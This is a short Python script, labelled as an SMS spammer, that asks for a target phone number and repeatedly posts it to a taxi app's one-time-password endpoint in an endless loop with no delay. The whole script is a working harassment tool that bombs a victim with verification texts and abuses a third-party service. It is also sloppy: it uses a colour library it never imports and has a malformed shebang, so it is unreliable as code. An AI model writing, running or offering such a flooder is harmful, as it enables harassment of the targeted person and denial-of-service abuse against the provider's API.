#!usr/lib/python3
import requests
import time

## SMS SPAMMER 
prejudice = input(Fore.BLUE+'Enter Fucking Target Prejudice Number(Example:98)=> ')
Number = input(Fore.BLUE+'Enter Your Fucking Target Number=> ')
SmsLink = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
Data = {"cellphone":"+"+prejudice+Number}

while True:
    requests.post(SmsLink,data=Data)
    print(Fore.RED+'Alert:',Fore.CYAN+'Fucking SMS Sent')
    time.sleep(0)